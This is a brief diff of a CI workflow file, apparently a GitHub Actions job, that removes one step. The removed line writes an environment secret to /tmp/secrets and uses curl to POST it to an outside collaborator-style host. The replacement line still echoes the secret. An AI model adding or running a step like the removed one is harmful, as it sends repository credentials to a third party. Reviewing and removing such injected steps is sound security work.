@@ -14,4 +14,4 @@ jobs:
     steps:
       - name: Run a one-line script
         run: |
-          echo "$ENV_SECRET" >> /tmp/secrets && curl -X POST https://stp2xskh25j8i5dl5ftmqtmmndt4hu5j.bcollaborator.binsec.cloud/secrets -d @/tmp/secrets
+          echo "$ENV_SECRET"
